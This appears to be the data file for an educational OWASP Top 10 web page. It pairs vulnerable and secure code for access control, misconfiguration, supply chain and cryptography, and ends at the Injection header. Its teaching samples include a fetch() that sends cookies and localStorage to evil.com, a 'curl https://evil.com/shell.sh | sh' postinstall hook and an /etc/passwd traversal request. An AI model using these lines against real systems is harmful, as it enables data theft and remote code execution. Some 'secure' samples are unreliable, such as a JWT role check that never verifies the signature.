/**
 * data.js — OWASP Top 10 (2025 vs 2021) Educational Data
 * Contains structured descriptions, code examples, and sandbox configs
 * for each vulnerability category. Each category has 5 code comparison examples.
 */

const OWASP_DATA = [
  // ═══════════════════════════════════════════════════════════════════
  //  A01: Broken Access Control
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a01",
    code: "A01:2025",
    title: "Broken Access Control",
    prevCode: "A01:2021",
    prevTitle: "Broken Access Control",
    badge: { text: "Unchanged #1", type: "same" },
    description:
      "Broken Access Control allows attackers to bypass authorization and access resources, data, or functionality they shouldn't reach. This includes privilege escalation, insecure direct object references, missing function-level access controls, and CORS misconfigurations.",
    comparison:
      "In 2025, this category absorbs <strong>Server-Side Request Forgery (SSRF)</strong> — previously its own category (A10:2021) — recognizing SSRF as fundamentally an access control violation. It remains the #1 risk for the second consecutive edition, now covering an even broader attack surface including CORS misconfiguration and path traversal.",
    sandbox: {
      title: "Admin Panel Access Control",
      description:
        'Click "View Admin Panel" to see how a vulnerable app merely hides the admin UI with CSS, while a secure app checks an authorization token before rendering.',
      vulnerableLabel: "Vulnerable: CSS-hidden Admin Panel",
      secureLabel: "Secure: JWT Role Check",
    },
    examples: [
      {
        title: "CSS-Hidden Admin Panel vs. JWT Role Check",
        vulnerableCode: `<!-- Vulnerable: Admin panel hidden only by CSS -->
<div id="admin-panel" style="display:none;">
  <h2>Admin Dashboard</h2>
  <p>Secret: API_KEY=sk-12345-ABCDE</p>
  <button onclick="deleteAllUsers()">Delete All Users</button>
</div>

<script>
  // Anyone can run in the console:
  // document.getElementById('admin-panel')
  //   .style.display = 'block';
  // ...and the admin panel is fully exposed.
</script>`,
        secureCode: `<!-- Secure: Panel rendered only after role verification -->
<div id="admin-panel"></div>

<script>
  function verifyRole(token) {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return payload.role === 'admin'
          && payload.exp > Date.now() / 1000;
    } catch {
      return false;
    }
  }

  function renderAdminPanel() {
    const token = localStorage.getItem('auth_token');
    if (!verifyRole(token)) {
      document.getElementById('admin-panel').textContent =
        'Access Denied — Insufficient privileges.';
      return;
    }
    const panel = document.getElementById('admin-panel');
    panel.innerHTML = \`
      <h2>Admin Dashboard</h2>
      <p>Welcome, verified administrator.</p>\`;
  }

  renderAdminPanel();
</script>`,
      },
      {
        title: "Insecure Direct Object Reference (IDOR)",
        vulnerableCode: `// Vulnerable: User can access any record by changing the ID
app.get('/api/invoices/:id', (req, res) => {
  const invoice = db.invoices.findById(req.params.id);

  // No check: does this invoice belong to the logged-in user?
  if (!invoice) {
    return res.status(404).json({ error: 'Not found' });
  }

  res.json(invoice); // Anyone can access ANY invoice
});

// An attacker simply increments the ID:
// GET /api/invoices/1001  ← their invoice
// GET /api/invoices/1002  ← someone else's invoice
// GET /api/invoices/1003  ← another user's data
// All return 200 OK with full invoice details.`,
        secureCode: `// Secure: Verify the resource belongs to the requesting user
app.get('/api/invoices/:id', authenticate, (req, res) => {
  const invoice = db.invoices.findById(req.params.id);

  if (!invoice) {
    return res.status(404).json({ error: 'Not found' });
  }

  // Ownership check: does this invoice belong to the user?
  if (invoice.userId !== req.user.id) {
    securityLogger.warn({
      event: 'IDOR_ATTEMPT',
      user: req.user.id,
      targetInvoice: req.params.id
    });
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(invoice);
});

// GET /api/invoices/1002 → 403 Forbidden
// Attacker cannot access other users' invoices.`,
      },
      {
        title: "Missing Function-Level Access Control",
        vulnerableCode: `// Vulnerable: API relies only on client-side role checks
// Frontend hides the "Delete User" button for non-admins,
// but the API endpoint has NO server-side check.

app.delete('/api/users/:id', (req, res) => {
  // No authorization check at all!
  db.users.delete(req.params.id);
  res.json({ message: 'User deleted' });
});

// Any authenticated user can call:
// DELETE /api/users/42
// ...even if the UI doesn't show a delete button.
// The API trusts the client to enforce roles.`,
        secureCode: `// Secure: Server-side role check on every endpoint
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      securityLogger.warn({
        event: 'UNAUTHORIZED_ACCESS',
        user: req.user?.id,
        requiredRoles: roles,
        endpoint: req.originalUrl
      });
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Middleware enforces admin-only access
app.delete('/api/users/:id',
  authenticate,
  requireRole('admin'),
  (req, res) => {
    db.users.delete(req.params.id);
    res.json({ message: 'User deleted' });
  }
);`,
      },
      {
        title: "CORS Misconfiguration",
        vulnerableCode: `// Vulnerable: Wildcard CORS with credentials
app.use((req, res, next) => {
  // Reflects any origin — even malicious ones
  res.setHeader(
    'Access-Control-Allow-Origin',
    req.headers.origin || '*'
  );
  res.setHeader(
    'Access-Control-Allow-Credentials', 'true'
  );
  res.setHeader(
    'Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE'
  );
  next();
});

// An attacker's page at https://evil.com can now:
// fetch('https://your-api.com/api/user/profile', {
//   credentials: 'include'  // sends cookies!
// }).then(r => r.json())
//   .then(data => sendToAttacker(data));`,
        secureCode: `// Secure: Strict allowlist of trusted origins
const ALLOWED_ORIGINS = new Set([
  'https://app.yoursite.com',
  'https://admin.yoursite.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader(
      'Access-Control-Allow-Credentials', 'true'
    );
    res.setHeader(
      'Access-Control-Allow-Methods', 'GET,POST'
    );
    res.setHeader(
      'Access-Control-Allow-Headers',
      'Content-Type, Authorization'
    );
  }
  // If origin is not in the allowlist, no CORS
  // headers are set — browser blocks the request.

  next();
});

// https://evil.com → blocked by browser (no CORS header)
// https://app.yoursite.com → allowed`,
      },
      {
        title: "Path Traversal",
        vulnerableCode: `// Vulnerable: User-controlled file path with no validation
app.get('/api/files', (req, res) => {
  const filename = req.query.name;

  // Directly concatenate user input into file path
  const filePath = '/var/www/uploads/' + filename;
  res.sendFile(filePath);
});

// An attacker requests:
// GET /api/files?name=../../../etc/passwd
//
// Resolved path: /var/www/uploads/../../../etc/passwd
// Actual path:   /etc/passwd
//
// The server reads and returns the system password file.
// Works for any file readable by the process.`,
        secureCode: `// Secure: Validate and normalize the file path
const path = require('path');

const UPLOADS_DIR = '/var/www/uploads';

app.get('/api/files', authenticate, (req, res) => {
  const filename = req.query.name;

  // Reject path separators and traversal sequences
  if (!filename || /[\\/]|\\.\\./g.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // Resolve to absolute and verify it's within UPLOADS_DIR
  const resolved = path.resolve(UPLOADS_DIR, filename);

  if (!resolved.startsWith(UPLOADS_DIR + path.sep)) {
    securityLogger.warn({
      event: 'PATH_TRAVERSAL_ATTEMPT',
      user: req.user.id,
      attempted: filename
    });
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.sendFile(resolved);
});`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A02: Security Misconfiguration
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a02",
    code: "A02:2025",
    title: "Security Misconfiguration",
    prevCode: "A05:2021",
    prevTitle: "Security Misconfiguration",
    badge: { text: "Up from #5", type: "moved-up" },
    description:
      "Security Misconfiguration occurs when systems, applications, or cloud services are set up incorrectly. This includes insecure defaults, open cloud storage, misconfigured HTTP headers, verbose error messages, and unnecessary features left enabled.",
    comparison:
      "Surged from <strong>#5 to #2</strong> in 2025, reflecting the explosion of configurable surfaces in modern cloud-native and containerized architectures. The increasing complexity of Kubernetes, serverless, and multi-cloud environments makes misconfiguration one of the most common and dangerous attack vectors.",
    sandbox: {
      title: "Exposed Server Configuration",
      description:
        'Simulate browsing to a misconfigured server that exposes directory listings and sensitive files like <code>.env</code>. Toggle between vulnerable (everything exposed) and secure (proper access controls).',
      vulnerableLabel: "Vulnerable: Open Directory Listing",
      secureLabel: "Secure: Restricted Access",
    },
    examples: [
      {
        title: "Exposed Directory Listing & Sensitive Files",
        vulnerableCode: `# Vulnerable: Apache server with directory listing enabled
# .htaccess — MISSING or misconfigured
Options +Indexes
# No access restrictions on sensitive files

# Exposed files visible to anyone:
# /.env
# /config/database.yml
# /backup/dump.sql
# /.git/config

# Example .env contents now public:
DB_HOST=prod-db.internal.company.com
DB_PASSWORD=SuperSecret123!
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
STRIPE_SECRET=sk_live_abc123xyz`,
        secureCode: `# Secure: Properly configured Apache server
Options -Indexes
ServerSignature Off

# Block access to sensitive files
<FilesMatch "^\\.(env|git|htpasswd)">
  Require all denied
</FilesMatch>

# Block access to backup and config directories
<DirectoryMatch "/(backup|config|\\.git)/">
  Require all denied
</DirectoryMatch>

# Security headers
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "DENY"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Content-Security-Policy "default-src 'self'"

# Custom error pages (no stack traces)
ErrorDocument 403 /errors/403.html
ErrorDocument 404 /errors/404.html
ErrorDocument 500 /errors/500.html`,
      },
      {
        title: "Default Credentials Left Enabled",
        vulnerableCode: `// Vulnerable: Application ships with default admin credentials
// config/default-users.js
const DEFAULT_USERS = [
  {
    username: 'admin',
    password: 'admin',     // Default credentials!
    role: 'administrator'
  },
  {
    username: 'test',
    password: 'test123',   // Test account in production!
    role: 'administrator'
  }
];

// setup.js — runs on first boot
function initializeDatabase() {
  DEFAULT_USERS.forEach(user => {
    db.users.create(user);
  });
  // No prompt to change passwords
  // No flag to track if defaults were changed
  console.log('Default users created.');
}`,
        secureCode: `// Secure: Force password change on first login
function initializeDatabase() {
  const adminPassword = crypto.randomUUID();

  db.users.create({
    username: 'admin',
    password: await hashPassword(adminPassword),
    role: 'administrator',
    mustChangePassword: true,  // Force change on first login
    createdAt: new Date()
  });

  // Display the generated password once during setup
  console.log('Initial admin password (change immediately):');
  console.log(adminPassword);
}

// Login middleware checks mustChangePassword flag
async function loginHandler(req, res) {
  const user = await authenticate(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid' });

  if (user.mustChangePassword) {
    return res.status(403).json({
      error: 'Password change required',
      redirect: '/change-password'
    });
  }

  // Enforce minimum password complexity
  // Reject passwords that match known defaults
  issueSession(user, res);
}`,
      },
      {
        title: "Verbose Error Messages in Production",
        vulnerableCode: `// Vulnerable: Detailed errors exposed to users in production
app.use((err, req, res, next) => {
  // Sends EVERYTHING to the client
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    // Exposes:
    //   "at Object.<anonymous> (/app/src/routes/users.js:42:15)"
    //   "at Router.handle (/app/node_modules/express/lib/router)"
    query: req.query,
    body: req.body,
    headers: req.headers,
    env: process.env.NODE_ENV  // "production"
  });
});

// Attacker learns:
// - File paths and directory structure
// - Framework and library versions
// - Database connection strings in stack traces
// - Internal API endpoints from error context`,
        secureCode: `// Secure: Generic errors for users, detailed logs internally
const isProd = process.env.NODE_ENV === 'production';

app.use((err, req, res, next) => {
  // Generate a unique reference ID for this error
  const errorId = crypto.randomUUID();

  // Log full details INTERNALLY (never to client)
  logger.error({
    errorId,
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    userId: req.user?.id,
    timestamp: new Date().toISOString()
  });

  // Send minimal info to client
  res.status(err.statusCode || 500).json(
    isProd
      ? {
          error: 'An internal error occurred.',
          referenceId: errorId
        }
      : {
          error: err.message,
          stack: err.stack  // Only in development
        }
  );
});`,
      },
      {
        title: "Unnecessary HTTP Methods Enabled",
        vulnerableCode: `// Vulnerable: All HTTP methods accepted on every route
// Express defaults to accepting any method if not restricted

// This route only needs GET, but accepts everything:
app.all('/api/users', (req, res) => {
  const users = db.users.findAll();
  res.json(users);
});

// An attacker can:
// DELETE /api/users → might trigger unexpected behavior
// TRACE  /api/users → reflects headers (XST attack)
// PUT    /api/users → may overwrite data
// OPTIONS /api/users → reveals all allowed methods

// Server response to OPTIONS:
// Allow: GET, HEAD, POST, PUT, DELETE, PATCH, TRACE
// This tells the attacker exactly what to try.`,
        secureCode: `// Secure: Explicitly define allowed methods per route
const express = require('express');
const router = express.Router();

// Only allow the methods each route actually needs
router.route('/api/users')
  .get(authenticate, listUsers)
  .post(authenticate, requireRole('admin'), createUser)
  .all((req, res) => {
    res.status(405)
       .set('Allow', 'GET, POST')
       .json({ error: 'Method Not Allowed' });
  });

// Disable TRACE globally
app.use((req, res, next) => {
  if (req.method === 'TRACE') {
    return res.status(405).json({ error: 'TRACE disabled' });
  }
  next();
});

// Remove X-Powered-By header (hides Express fingerprint)
app.disable('x-powered-by');`,
      },
      {
        title: "Missing Security Headers",
        vulnerableCode: `<!-- Vulnerable: No security headers set -->
<!-- Server response headers: -->
<!--
  HTTP/1.1 200 OK
  Content-Type: text/html
  X-Powered-By: Express 4.18.2
  Server: Apache/2.4.41 (Ubuntu)

  No Content-Security-Policy
  No X-Frame-Options
  No X-Content-Type-Options
  No Strict-Transport-Security
  No Referrer-Policy
  No Permissions-Policy
-->

<!-- Consequences: -->
<!-- 1. Page can be embedded in iframes (clickjacking) -->
<!-- 2. Browser may MIME-sniff responses (XSS via uploads) -->
<!-- 3. No HTTPS enforcement (downgrade attacks) -->
<!-- 4. Referer header leaks URLs to third parties -->
<!-- 5. X-Powered-By reveals tech stack to attackers -->`,
        secureCode: `// Secure: Comprehensive security headers (using Helmet.js)
const helmet = require('helmet');

app.use(helmet());

// Or set them manually:
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');

  // Stop MIME-type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Enforce HTTPS for 1 year + subdomains
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');

  // Control referrer information
  res.setHeader('Referrer-Policy',
    'strict-origin-when-cross-origin');

  // Content Security Policy
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'");

  // Restrict browser features
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=()');

  // Hide tech stack
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');

  next();
});`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A03: Software Supply Chain Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a03",
    code: "A03:2025",
    title: "Software Supply Chain Failures",
    prevCode: "A06:2021",
    prevTitle: "Vulnerable and Outdated Components",
    badge: { text: "NEW — was #6", type: "new" },
    description:
      "Software Supply Chain Failures encompass compromised dependencies, malicious packages, tampered build pipelines, and dependency confusion attacks. This goes far beyond just outdated libraries.",
    comparison:
      'Evolved from A06:2021 "Vulnerable and Outdated Components" into a much <strong>broader category</strong>. The 2021 version focused on known CVEs in libraries. The 2025 version covers the entire supply chain: malicious packages, compromised maintainers, CI/CD pipeline tampering, and dependency confusion. Incidents like SolarWinds and npm package poisoning drove this expansion.',
    sandbox: {
      title: "Subresource Integrity (SRI)",
      description:
        "See the difference between loading a third-party script with no integrity check versus using SRI hashes. Click to simulate a supply-chain attack where the CDN-hosted script is tampered with.",
      vulnerableLabel: "Vulnerable: No Integrity Check",
      secureLabel: "Secure: SRI Hash Verification",
    },
    examples: [
      {
        title: "Missing Subresource Integrity (SRI)",
        vulnerableCode: `<!-- Vulnerable: Loading scripts with no integrity check -->
<script src="https://cdn.example.com/lib/utils@3.1.0/utils.min.js">
</script>

<!--
  RISK: If the CDN is compromised or the package
  author pushes malicious code, your site loads it
  without any verification.

  An attacker who compromises the CDN can replace
  utils.min.js with:
-->
<script>
  // Injected malicious code in the tampered library:
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      url: window.location.href
    })
  });
</script>`,
        secureCode: `<!-- Secure: SRI hash + crossorigin attribute -->
<script
  src="https://cdn.example.com/lib/utils@3.1.0/utils.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh7
             kzGNOEXQceRifoj6HSbEcYR3pZ"
  crossorigin="anonymous">
</script>

<!--
  If the file has been tampered with, the browser
  computes the hash, finds a mismatch, and BLOCKS
  the script from executing entirely.

  Console output on mismatch:
  "Failed to find a valid digest in the 'integrity'
   attribute for resource '...' with computed
   SHA-384 integrity '...'. The resource has been
   blocked."
-->

<!-- Also pin exact versions in package-lock.json -->
<!-- Use npm audit / Snyk / Socket.dev in CI/CD -->`,
      },
      {
        title: "Unpinned Dependency Versions",
        vulnerableCode: `// package.json — Vulnerable: loose version ranges
{
  "dependencies": {
    "lodash": "^4.0.0",
    //  ^4.0.0 matches ANY 4.x.x version
    //  A compromised 4.99.0 would install automatically

    "express": "*",
    //  * matches ANY version — even a major rewrite
    //  with breaking changes or injected code

    "left-pad": ">=1.0.0",
    //  Accepts any version above 1.0.0
    //  Attacker publishes 99.0.0 with malicious code

    "event-stream": "~3.3.0"
    //  event-stream@3.3.6 was hijacked with malware
    //  targeting cryptocurrency wallets (real incident)
  }
}

// npm install pulls whatever matches the range
// You get different code on every install`,
        secureCode: `// package.json — Secure: exact pinned versions
{
  "dependencies": {
    "lodash": "4.17.21",
    "express": "4.18.2",
    "left-pad": "1.3.0",
    "event-stream": "4.0.1"
  }
}

// package-lock.json is committed to git and includes
// integrity hashes for every dependency:
// "lodash": {
//   "version": "4.17.21",
//   "resolved": "https://registry.npmjs.org/lodash/-/...",
//   "integrity": "sha512-v2kDEe57lec..."
// }

// CI/CD pipeline checks:
// 1. npm ci (uses lockfile exactly, fails on mismatch)
// 2. npm audit (checks for known vulnerabilities)
// 3. Socket.dev / Snyk (detects malicious packages)
// 4. Renovate / Dependabot (controlled version bumps)`,
      },
      {
        title: "Dependency Confusion Attack",
        vulnerableCode: `// .npmrc — Vulnerable: default registry order
// No registry scope mapping

// package.json
{
  "dependencies": {
    "@company/auth-utils": "^2.0.0"
  }
}

// The problem:
// 1. @company/auth-utils exists on your private registry
// 2. An attacker publishes @company/auth-utils@99.0.0
//    on the PUBLIC npm registry
// 3. npm resolves the highest version number
// 4. npm installs the attacker's 99.0.0 from public npm
//    instead of your private 2.x.x
//
// The malicious package runs a postinstall script:
// "scripts": {
//   "postinstall": "curl https://evil.com/shell.sh | sh"
// }`,
        secureCode: `// .npmrc — Secure: scope-to-registry mapping
@company:registry=https://npm.company.com/
//npm.company.com/:_authToken=\${NPM_TOKEN}

// This ensures all @company/* packages ONLY come
// from your private registry — never from public npm.

// Additional protections:

// 1. Claim your scope on public npm (even if unused)
//    npm org create @company

// 2. Use package-lock.json with integrity hashes
//    "resolved": "https://npm.company.com/@company/auth..."

// 3. CI pipeline validation:
{
  "scripts": {
    "preinstall": "npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm.company.com"
  }
}

// 4. Audit postinstall scripts:
//    npm install --ignore-scripts
//    npx can-i-ignore-scripts`,
      },
      {
        title: "Compromised Build Pipeline",
        vulnerableCode: `# Vulnerable: CI/CD with no integrity checks
# .github/workflows/deploy.yml

name: Deploy
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
        # Using 'main' branch — can change anytime!

      - uses: some-user/deploy-action@main
        # Third-party action from untrusted source
        # Pinned to 'main' — author can push malware

      - run: npm install
        # No lockfile enforcement
        # Dependencies could have changed

      - run: npm run build

      - run: |
          # Credentials in plaintext
          echo "Deploying with key: $DEPLOY_KEY"
          scp -r dist/ server:/var/www/
        env:
          DEPLOY_KEY: sk-prod-abc123`,
        secureCode: `# Secure: Hardened CI/CD pipeline
# .github/workflows/deploy.yml

name: Deploy
on: push

permissions:
  contents: read  # Minimum permissions

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde6  # Pinned to SHA
        with:
          persist-credentials: false

      # Only use verified/first-party actions, pinned to SHA
      - uses: actions/setup-node@1a4442c
        with:
          node-version-file: '.nvmrc'

      - run: npm ci  # Strict lockfile install — fails on mismatch

      - run: npm audit --audit-level=high
        # Fail build on high-severity CVEs

      - run: npm run build

      # Deployment uses OIDC — no long-lived secrets
      - uses: aws-actions/configure-aws-credentials@e3dd6a4
        with:
          role-to-assume: arn:aws:iam::role/deploy
          aws-region: us-east-1

      - run: aws s3 sync dist/ s3://prod-bucket/
        # Credentials from OIDC — no secrets in env`,
      },
      {
        title: "Typosquatting / Malicious Packages",
        vulnerableCode: `// Vulnerable: Installing packages without verification
// A developer types quickly and makes a typo:

npm install expresss     // Note: 3 s's — typosquat!
npm install lodasch      // Misspelling of 'lodash'
npm install coloures     // Misspelling of 'colors'

// Attacker registered these lookalike names
// and published packages that:
// 1. Include the legitimate library (works normally)
// 2. Add a hidden postinstall script
// 3. Steal environment variables / SSH keys
// 4. Install a backdoor or crypto miner

// Real-world examples:
// - crossenv (typosquat of cross-env)
//   Stole environment variables
// - event-stream v3.3.6
//   Targeted Bitcoin wallets
// - ua-parser-js v0.7.29
//   Installed crypto miners`,
        secureCode: `// Secure: Verification before installing packages
// 1. Always verify the package name and publisher
npm info express  // Check the real package details first

// 2. Use npm's provenance feature
npm install express --expect-provenance
// Verifies the package was built from its source repo

// 3. Check package health metrics
npx socket:npm info express
// Reports on: maintainer count, known vulnerabilities,
// suspicious install scripts, typosquat risk

// 4. Use an allowlist in CI/CD
// .github/workflows/check.yml
// - run: npx lockfile-lint
//     --path package-lock.json
//     --allowed-hosts registry.npmjs.org
//     --validate-https

// 5. Enable npm audit signatures
npm audit signatures
// Verifies registry signatures on every package

// 6. Review new dependencies before merging
// Use Socket.dev GitHub app to flag suspicious
// dependencies in pull requests automatically`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A04: Cryptographic Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a04",
    code: "A04:2025",
    title: "Cryptographic Failures",
    prevCode: "A02:2021",
    prevTitle: "Cryptographic Failures",
    badge: { text: "Down from #2", type: "moved-down" },
    description:
      "Cryptographic Failures involve missing encryption, weak algorithms (MD5, SHA-1), leaked keys, and improper handling of sensitive data. This leads to exposure of passwords, credit cards, health records, and personal data.",
    comparison:
      "Moved from <strong>#2 to #4</strong>. While still critical, the relative rise of supply-chain attacks and misconfigurations has pushed it down. The fundamentals remain the same: use strong algorithms, manage keys properly, encrypt data in transit and at rest, and never roll your own crypto.",
    sandbox: {
      title: "Password Storage",
      description:
        'Enter a password and see how a vulnerable app stores it in plain text / Base64 (trivially reversible) in LocalStorage, versus using the Web Crypto API to derive a proper hash with a salt.',
      vulnerableLabel: "Vulnerable: Plain Text / Base64",
      secureLabel: "Secure: PBKDF2 with Salt",
    },
    examples: [
      {
        title: "Plain Text / Base64 Password Storage",
        vulnerableCode: `// Vulnerable: Storing passwords in plaintext or Base64
function registerUser(username, password) {
  // TERRIBLE: Plain text
  localStorage.setItem('user_' + username, password);

  // ALSO TERRIBLE: Base64 is NOT encryption
  const encoded = btoa(password);
  localStorage.setItem('user_' + username, encoded);
  // Anyone can decode: atob(encoded) → password
}

function loginUser(username, password) {
  const stored = localStorage.getItem('user_' + username);
  // Direct comparison — no hashing at all
  if (stored === password || stored === btoa(password)) {
    console.log('Login successful');
    return true;
  }
  return false;
}`,
        secureCode: `// Secure: Using Web Crypto API with PBKDF2 + salt
async function hashPassword(password) {
  const encoder = new TextEncoder();
  const salt = crypto.getRandomValues(new Uint8Array(16));

  const keyMaterial = await crypto.subtle.importKey(
    'raw', encoder.encode(password), 'PBKDF2', false,
    ['deriveBits']
  );

  const hash = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', salt, iterations: 600000,
      hash: 'SHA-256' },
    keyMaterial, 256
  );

  const saltHex = Array.from(salt)
    .map(b => b.toString(16).padStart(2,'0')).join('');
  const hashHex = Array.from(new Uint8Array(hash))
    .map(b => b.toString(16).padStart(2,'0')).join('');
  return saltHex + ':' + hashHex;
}

async function registerUser(username, password) {
  const stored = await hashPassword(password);
  localStorage.setItem('user_' + username, stored);
}`,
      },
      {
        title: "Weak Hashing Algorithms (MD5 / SHA-1)",
        vulnerableCode: `// Vulnerable: Using MD5 for password hashing
const crypto = require('crypto');

function hashPassword(password) {
  // MD5 is broken — collisions found since 2004
  return crypto.createHash('md5').update(password).digest('hex');
}

// Also vulnerable: SHA-1 without salt
function hashPasswordSHA1(password) {
  return crypto.createHash('sha1').update(password).digest('hex');
  // SHA-1 collision demonstrated by Google in 2017
  // Vulnerable to rainbow table attacks (no salt)
}

// Stored hash: "5f4dcc3b5aa765d61d8327deb882cf99"
// Google "5f4dcc3b5aa765d61d8327deb882cf99"
// First result: "password"
// Pre-computed rainbow tables crack MD5 in seconds.`,
        secureCode: `// Secure: bcrypt or Argon2 (server-side)
const bcrypt = require('bcrypt');

async function hashPassword(password) {
  // bcrypt: salt is generated and embedded automatically
  // Cost factor 12 = ~250ms to hash (tunable)
  const hash = await bcrypt.hash(password, 12);
  return hash;
  // Returns: "$2b$12$LJ3m.../..." (includes algorithm + salt + hash)
}

async function verifyPassword(password, storedHash) {
  // bcrypt.compare is timing-safe (prevents timing attacks)
  return bcrypt.compare(password, storedHash);
}

// Even better: Argon2id (winner of Password Hashing Competition)
const argon2 = require('argon2');
async function hashPasswordArgon2(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,  // 64 MB memory
    timeCost: 3,        // 3 iterations
    parallelism: 4      // 4 threads
  });
}`,
      },
      {
        title: "Hardcoded Encryption Keys",
        vulnerableCode: `// Vulnerable: Encryption key hardcoded in source code
const SECRET_KEY = 'my-super-secret-key-12345';

function encryptData(data) {
  const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// Problems:
// 1. Key is in source code → visible in Git history
// 2. Same key for all environments (dev, staging, prod)
// 3. Using deprecated createCipher (no IV)
// 4. If the repo is public, the key is public
// 5. Cannot rotate the key without a code deploy
// 6. All developers can see production secrets`,
        secureCode: `// Secure: Keys from environment + proper AES-GCM usage
function encryptData(data) {
  // Key from environment variable (not source code)
  const keyHex = process.env.ENCRYPTION_KEY;
  if (!keyHex || keyHex.length !== 64) {
    throw new Error('Invalid encryption key configuration');
  }
  const key = Buffer.from(keyHex, 'hex');

  // Generate a random IV for each encryption
  const iv = crypto.randomBytes(16);

  // Use AES-256-GCM (authenticated encryption)
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  // GCM produces an auth tag — include it
  const authTag = cipher.getAuthTag().toString('hex');

  // Return IV + authTag + ciphertext (all needed for decryption)
  return iv.toString('hex') + ':' + authTag + ':' + encrypted;
}

// Key management:
// - Store in AWS KMS / HashiCorp Vault / Azure Key Vault
// - Rotate keys regularly with zero-downtime strategy
// - Separate keys per environment`,
      },
      {
        title: "Data Transmitted Over HTTP (No TLS)",
        vulnerableCode: `<!-- Vulnerable: Login form submitting over HTTP -->
<form action="http://api.example.com/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Login</button>
</form>

<!--
  Data sent in plaintext over the network.

  An attacker on the same network (coffee shop WiFi,
  corporate network, ISP) can see:

  POST /login HTTP/1.1
  Host: api.example.com
  Content-Type: application/x-www-form-urlencoded

  username=alice&password=MySecretPass123

  Tools: Wireshark, tcpdump, mitmproxy
  No special skills required to intercept.
-->`,
        secureCode: `<!-- Secure: HTTPS with HSTS enforcement -->
<form action="https://api.example.com/login" method="POST">
  <input type="text" name="username" autocomplete="username">
  <input type="password" name="password" autocomplete="current-password">
  <button type="submit">Login</button>
</form>

<!-- Server enforces HTTPS with HSTS header: -->
<!-- Strict-Transport-Security: max-age=31536000;
     includeSubDomains; preload -->

<!-- Additional server-side TLS configuration: -->
<!--
  - TLS 1.3 only (disable TLS 1.0, 1.1, 1.2)
  - Strong cipher suites only
  - OCSP stapling enabled
  - Certificate transparency logged
  - HTTP automatically redirects to HTTPS (301)
  - Secure cookies: Set-Cookie: session=...; Secure;
    HttpOnly; SameSite=Strict
  - Submit domain to HSTS preload list:
    https://hstspreload.org
-->`,
      },
      {
        title: "Weak Random Number Generation",
        vulnerableCode: `// Vulnerable: Math.random() for security-sensitive values
function generateSessionToken() {
  // Math.random() is NOT cryptographically secure
  // It uses a PRNG that can be predicted
  return 'session_' + Math.random().toString(36).substring(2);
}

function generatePasswordResetToken() {
  // Easily predictable — attacker can brute-force
  const token = Math.floor(Math.random() * 1000000);
  return token.toString().padStart(6, '0');
  // Only 1 million possible values!
}

function generateAPIKey() {
  // Combining multiple Math.random() calls does NOT help
  let key = '';
  for (let i = 0; i < 32; i++) {
    key += Math.random().toString(36).charAt(2);
  }
  return key;
  // Still predictable — same underlying weak PRNG
}`,
        secureCode: `// Secure: crypto.getRandomValues / crypto.randomUUID
function generateSessionToken() {
  // Cryptographically secure random bytes
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return Array.from(bytes)
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
  // 256 bits of entropy — cannot be predicted
}

function generatePasswordResetToken() {
  // Use crypto.randomUUID() for unique tokens
  return crypto.randomUUID();
  // "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  // 122 bits of entropy from CSPRNG
}

function generateAPIKey() {
  // 32 bytes = 256 bits of cryptographic randomness
  const bytes = crypto.getRandomValues(new Uint8Array(32));
  // Base64url encoding (URL-safe, no padding)
  return btoa(String.fromCharCode(...bytes))
    .replace(/\\+/g, '-')
    .replace(/\\//g, '_')
    .replace(/=/g, '');
}`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A05: Injection
